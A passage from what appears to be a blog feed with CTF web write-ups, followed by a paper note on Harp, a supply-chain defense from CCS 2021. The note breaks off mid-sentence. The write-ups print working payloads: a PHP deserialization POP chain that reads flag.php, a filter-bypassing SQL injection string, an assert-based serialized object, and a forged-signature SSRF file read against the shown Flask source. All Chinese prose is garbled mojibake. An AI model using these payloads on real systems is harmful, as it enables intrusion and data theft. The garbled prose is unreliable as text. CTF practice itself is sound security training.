&#125;</span></span><br><span class="line"><span class="comment">// else&#123;</span></span><br><span class="line"><span class="comment">//     $a=new Show;</span></span><br><span class="line"><span class="comment">//     highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„é€ popé“¾ï¼š</p><ol><li>å…¥å£å±Showç±»ï¼Œé€šè¿‡preg_matchï¼Œå°†$this-&gt;sourceæŒ‡å®šä¸ºShowç±»ï¼Œè°ƒç”¨å…¶__toStringæ–¹æ³•ï¼›</li><li>å°†$this-&gt;stræŒ‡å®šä¸ºTestç±»ï¼Œä½†Testç±»å¹¶æ²¡æœ‰sourceè¿™ä¸ªå±æ€§ï¼Œè°ƒç”¨å…¶__getæ–¹æ³•ï¼›</li><li>å°†Testç±»çš„å±æ€§pæŒ‡å®šä¸ºModifierï¼Œè°ƒç”¨å…¶__invokeæ–¹æ³•ï¼›</li><li>è®¾å®š$valueä¸ºè¯»å–flag.phpçš„ä¼ªåè®®ã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>åœ¨å‘å¸ƒå¹¿å‘Šå¤„å­˜åœ¨æ³¨å…¥ï¼Œè¿‡æ»¤ç©ºæ ¼ï¼ˆ/**/ç»•è¿‡ï¼‰ï¼Œorï¼ˆmysql.innodb_table_statsæ›¿æ¢information_schemaï¼‰ï¼Œåå¼•å·ï¼ˆas ç»•è¿‡ï¼‰</p><p>æ¶‰åŠåˆ°äºŒæ¬¡æ³¨å…¥ã€ç»•è¿‡è¿‡æ»¤ã€æ— åˆ—åæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>X-Forwarded-For: 127.0.0.1</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>ååºåˆ—åŒ–ï¼Œç»“åˆassertæ‰§è¡Œphpä»£ç </p><p><code>O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯é˜…è¯»ä»£ç ï¼Œæ¢³ç†é€»è¾‘ï¼ˆmd5æ‰©å±•æ”»å‡»ä¹Ÿå¯ä»¥ï¼‰ï¼Œè¿™é‡Œåˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ€è·¯ï¼ˆpython2.7 urllib.urlopen(param) å¯ä»¥ç›´æ¥paramä¸ºæ–‡ä»¶åè¿›è¡Œè®¿é—®è€Œä¸éœ€è¦æŒ‡å®šåè®®ï¼Œé»˜è®¤fileï¼Œå¤‡é€‰æ–¹æ¡ˆlocal_fileåè®®ï¼‰</p><ol><li><p>è®¿é—®/geneSign?param=flag.txtread æ‹¿åˆ°sign</p></li><li><p>è®¿é—®/De1ta?param=flag.txtï¼Œæ„é€ <code>Cookie: action=readscan;sign=1491c8c5b4ec8dbb050cc8524bfe3c32</code></p></li></ol><p>è¿˜å¯ä»¥ç”¨md5æ‰©å±•æ”»å‡»ï¼Œåˆ©ç”¨hashpumpå·¥å…·<a href="https://joychou.org/web/hash-length-extension-attack.html">https://joychou.org/web/hash-length-extension-attack.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Supply-Chain Vulnerability Elimination via Active Learning and Regeneration</title>
      <link href="/2021/09/28/Supply-Chain%20Vulnerability%20Elimination%20via%20Active%20Learning%20and%20Regeneration/"/>
      <url>/2021/09/28/Supply-Chain%20Vulnerability%20Elimination%20via%20Active%20Learning%20and%20Regeneration/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šN Vasilakis, A Benetopoulos, S Handa</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šSupply-Chain Vulnerability Elimination via Active Learning and Regeneration</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="http://nikos.vasilak.is/p/harp:ccs:2021.pdf">http://nikos.vasilak.is/p/harp:ccs:2021.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šCCS 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>ç½‘ç»œæ”»é˜²å‘å±•è‡³ä»Šï¼Œæ”»ç ´è½¯ä»¶ç›´æ¥å®ç°æ”»å‡»æ„ˆå‘å›°éš¾ï¼Œè½¯ä»¶ä¾›åº”é“¾æ”»å‡»åº”è¿è€Œç”Ÿã€‚æ”»å‡»è€…å¾€å¾€ä¸ä¼šç›´æ¥é’ˆå¯¹è¿™äº›è½¯ä»¶å‘èµ·æ”»å‡»ï¼Œè€Œæ˜¯è½¬ä¸ºå¯¹å…¶ä¾›åº”å•†å‘èµ·æ”»å‡»ï¼Œåˆ©ç”¨è¿™äº›è½¯ä»¶ä¸­æˆ–å¤šæˆ–å°‘/ç›´æ¥æˆ–é—´æ¥ä¾èµ–äºä¾›åº”å•†è¿™ä¸€åŸºæœ¬æƒ…å†µï¼Œæœ‰ç›®çš„åœ°å‘è¿™äº›ä¾›åº”å•†æ‰€æä¾›çš„ç»„ä»¶ä»£ç ä¸­æ’å…¥å…¶ç²¾å¿ƒæ„é€ çš„æ¶æ„ä»£ç ï¼Œä»¥æ­¤è¾¾åˆ°æˆåŠŸæ¤å…¥åé—¨ç­‰ç›®çš„ã€‚<br>ç”±äºä¸€ç³»åˆ—åŸå› ï¼Œè¯¸å¦‚è½¯ä»¶å¼€å‘è€…æ²¡åŠæ³•å¯¹å…¶é›†æˆçš„æ‰€æœ‰ç»„ä»¶çš„ä»£ç è¿›è¡Œäººå·¥å®¡æŸ¥ï¼Œå³ä¾¿æ˜¯é‚£äº›è¢«å¹¿æ³›ä½¿ç”¨ï¼Œä¼ æ’­åº¦æé«˜çš„ç»„ä»¶ä¹Ÿæœ‰å°†æ¼æ´å¼•å…¥è½¯ä»¶ä¸­çš„çœŸå®æ¡ˆä¾‹ã€‚</p><p>ä¸ºäº†è¿™äº›å·²ç»è¢«æ”»é™·çš„ç»„ä»¶ä¸è¢«å®‰å…¨äººå‘˜æ£€æµ‹åˆ°ï¼Œé€šå¸¸æƒ…å†µä¸‹è¿™äº›æ¼æ´ä»…ä¼šåœ¨éå¸¸ç‰¹å®šçš„æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­è§¦å‘ï¼Œå¹¶è¡¨ç°å‡ºæ¶æ„è¡Œä¸ºï¼ˆä¾‹å¦‚çªƒå–æ•æ„Ÿæ•°æ®ï¼Œéšè”½æ‰§è¡Œå‘½ä»¤ç­‰ï¼‰ã€‚æ‰€ä»¥æœ€ä¸ºå¸¸è§çš„æƒ…å†µæ˜¯ï¼Œè½¯ä»¶ä»…èƒ½å¤Ÿè§‚å¯Ÿåˆ°ç»„å»ºçš„åŠŸèƒ½è¡Œä¸ºï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯ç»„ä»¶è¿”å›çš„ç»“æœï¼Œä½†å¹¶ä¸èƒ½å¤Ÿè§‚å¯Ÿåˆ°ç»„ä»¶åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºç°çš„ä¸€äº›æ¶æ„è¡Œä¸ºã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½œè€…ç ”ç©¶äº†ä¸€ç§æ–°æ–¹æ³•æ¥æ¶ˆé™¤è½¯ä»¶ç»„ä»¶ä¸­å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼Œä»¥æ­¤æ¥æ¶ˆé™¤æ½œåœ¨çš„ä¾›åº”é“¾æ”»å‡»é£é™©ã€‚è¿™ç§æ–¹æ³•é¦–å…ˆå‡å®šé‡‡ç”¨ä¸€ä¸ªä¸å®Œæ•´çš„ç»„ä»¶ï¼ˆè¢«æ”»å‡»è€…æ¤å…¥åé—¨ï¼‰ï¼Œåœ¨å®Œå…¨å—æ§çš„ç¯å¢ƒä¸­ç ”ç©¶å…¶è¡Œä¸ºï¼Œç„¶åå­¦ä¹ å…¶åŠŸèƒ½è¡Œä¸ºï¼ˆä¸ºäº†æ’é™¤æ‰æ¼æ´é‚£éƒ¨åˆ†å¸¦æ¥çš„è¡Œä¸ºç‰¹å¾ï¼‰ï¼Œç„¶ååˆ©ç”¨å­¦ä¹ åˆ°çš„æ¨¡å‹é‡æ–°ç”Ÿæˆè¯¥ç»„ä»¶çš„æ–°ç‰ˆæœ¬ï¼Œè¿™ç§æ–¹æ³•ä½œè€…ç§°å…¶ä¸ºALRï¼ˆactive library learning and re-generationï¼‰ã€‚ä½œè€…è®¾è®¡äº†ä¸€ä¸ªç³»ç»Ÿï¼ŒHarpï¼Œå®ƒä¸»è¦æ˜¯é€šè¿‡åº”ç”¨ä¸Šè¿°æ–¹æ³•æ¥è‡ªåŠ¨ç”Ÿæˆä¸€äº›å¹¿æ³›ä½¿ç”¨çš„å­—ç¬¦ä¸²ç›¸å…³ç»„ä»¶çš„æ— æ¼æ´ç‰ˆæœ¬ï¼Œä»¥åŠå»ºç«‹åœ¨è¿™äº›ç»„ä»¶ä¹‹ä¸Šçš„ä¸€äº›é«˜é˜¶ç»„ä»¶çš„æ— æ¼æ´ç‰ˆæœ¬ã€‚</p><p><strong>éƒ¨ç½²é˜¶æ®µ</strong><br>Harpæ”¯æŒä¸€ç³»åˆ—çš„éƒ¨ç½²æ–¹å¼ï¼Œä¸»è¦åˆ†æˆä¸¤ç±»ï¼š</p><ol><li>éƒ¨ç½²è‡³åº”ç”¨ç¨‹åºå¼€å‘ä¹‹å‰ï¼Œä»¥è·å¾—ä¸€ä¸ªå®Œå…¨å®‰å…¨çš„åŸºæœ¬å­—ç¬¦ä¸²ç›¸å…³ç»„ä»¶é›†åˆï¼Œè¿™ç§éƒ¨ç½²æ–¹å¼å¯ä»¥é›†æˆåˆ°ä¸€ä¸ªæˆ–è€…å¤šä¸ªç»„ç»‡å¼€å‘çš„å¤šä¸ªåº”ç”¨ç¨‹åºä¸­</li><li>éƒ¨ç½²è‡³å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä»¥æ›¿æ¢æ‰å…ˆå‰å¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ä¸€äº›ä¸ç¡®å®šçš„ç»„ä»¶</li></ol><p><strong>é’ˆå¯¹èŒƒå›´</strong><br>ä½œè€…çš„æ–¹æ³•é’ˆå¯¹çš„æ˜¯é‚£äº›è¢«å¹¿æ³›ä½¿ç”¨çš„æµè¡Œç»„ä»¶ä¸­ä½¿ç”¨çš„ç®€å•ç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶ä¹‹æ‰€ä»¥å®¹æ˜“å—åˆ°æ”»å‡»ä¸»è¦æ˜¯ï¼š</p><ol><li>è¿™äº›ç®€å•ç»„ä»¶è¢«ç”¨ä½œäºä¸€äº›é«˜çº§ç»„ä»¶çš„åŸºçŸ³ï¼Œä¸€æ—¦è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œå½±å“èŒƒå›´å·¨å¤§</li><li>é€šè¿‡è¿™äº›ç®€å•ç»„ä»¶æ¥æ§åˆ¶é‚£äº›é«˜çº§ç»„ä»¶ï¼Œè¿›è€Œæ§åˆ¶å¼€å‘è€…å¼€å‘çš„è½¯ä»¶ï¼Œæ¯”ç›´æ¥å°è¯•é€šè¿‡æ”»å‡»æ§åˆ¶é«˜çº§ç»„ä»¶æ›´å…·æœ‰å¯è¡Œæ€§ã€‚</li></ol><p>é™¤äº†ä¸Šè¿°çš„é‚£äº›ç®€å•ç»„ä»¶ï¼ŒHarpè¿˜å¯ä»¥é’ˆå¯¹é‚£äº›èƒ½å¤Ÿä½¿ç”¨DSLï¼ˆdomain-specific languageï¼‰æ•è·è¡Œä¸ºçš„ç»„ä»¶ï¼ŒDSLèƒ½å¤Ÿä¿ƒè¿›ç»„ä»¶è¡Œä¸ºçš„è¡¨ç¤ºå’Œæ¨ç†ï¼Œæ¶ˆé™¤é‚£äº›æ— æ³•è¢«è¡¨ç¤ºçš„æ¶æ„è¡Œä¸ºã€‚</p><h2 id="0x02-Harp"><a href="#0x02-Harp" class="headerlink" title="0x02 Harp"></a>0x02 Harp</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7b75ac58-73b7-4aa7-9dd6-7a3d68e0cfa7.png"><br>Harpèƒ½å¤Ÿå›ç­”ä»¥ä¸‹ä¸‰ä¸ªé—®é¢˜ï¼š </p><ol><li>Harpèƒ½å¤Ÿæ¶ˆé™¤çœŸæ­£çš„æ¼æ´ä¹ˆï¼Ÿ<br>ä½œè€…é€šè¿‡Harpå·²ç»æˆåŠŸæ¶ˆé™¤äº†ä¸‰ä¸ªå¤§è§„æ¨¡ä¾›åº”é“¾æ”»å‡»æ¼æ´ï¼Œå…¶å®Œç¾åœ°æ¶ˆé™¤äº†å¯¹å±é™©ä»£ç çš„ä»»ä½•ä¾èµ–ã€‚</li><li>ALRæ—¶é—´æ•ˆç‡å¦‚ä½•ï¼Ÿ<br>å°†å…¶åº”ç”¨äº17ä¸ªJavaScriptå­—ç¬¦ä¸²å¤„ç†ç»„ä»¶ï¼ŒHarpåœ¨1åˆ†é’Ÿå†…å­¦ä¼šäº†14ä¸ªç»„ä»¶ï¼Œè€Œæ‰€æœ‰ç»„ä»¶çš„å­¦ä¹ éƒ½åœ¨1å°æ—¶å†…å®Œæˆäº†ã€‚</li><li>è¿™äº›å†ç”Ÿæˆçš„ç»„ä»¶æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ<br>å†ç”Ÿç»„ä»¶çš„æ‰§è¡Œé€Ÿåº¦ç›¸è¾ƒäºåŸå§‹JavaScriptç»„ä»¶æµ®åŠ¨äº+2%~-7%ä¹‹é—´ï¼Œè¿™äº›ç”Ÿæˆçš„ç»„ä»¶æ²¡æœ‰å¯¼å…¥ä»»ä½•ä¸œè¥¿ï¼Œå®Œå…¨æ˜¯åŸºäºåŸç”Ÿçš„JavaScriptè¯­è¨€ã€‚</li><li>ALRé€‚ç”¨äºé™¤äº†JavaScriptä¹‹å¤–çš„è¯­è¨€ä¹ˆï¼Ÿ<br>å°è¯•åº”ç”¨äº5ä¸ªç”¨C/C++ç¼–å†™çš„ç»„ä»¶ä¸Šï¼ŒALRæˆåŠŸä»¥JavaScriptå†ç”Ÿæˆäº†å¯¹åº”çš„æ–°ç»„ä»¶ã€‚</li></ol><p>æ‰€å°è¯•åº”ç”¨Harpæ¥å†ç”Ÿæˆçš„JavaScriptç»„ä»¶å¦‚ä¸‹ï¼š<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/97946507-1937-4b80-a2cd-a7d1632b4725.png"></p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>æœ¬æ–‡åŸºäºç›®å‰ä¾›åº”é“¾æ”»å‡»çš„æ³›æ»¥åŠå…¶å½±å“ä¸¥é‡æ€§ï¼Œæå‡ºäº†ä¸€ç§æ–°çš„æ–¹æ³•ï¼Œå³ç»„ä»¶ä¸»åŠ¨å­¦ä¹ å’Œå†ç”Ÿæˆï¼Œä»¥é»‘ç›’çš„å½¢å¼æ¨æ–­å’Œé‡æ–°ç”Ÿæˆè¿™äº›ç»„ä»¶æ­£å¸¸çš„åŠŸèƒ½è¡Œä¸ºï¼Œè¿›è€Œå†ç”Ÿæˆå®‰å…¨æ— æ¼æ´çš„ç‰ˆæœ¬ã€‚</p><p>è¯»å®Œæ•´ç¯‡æ–‡ç« 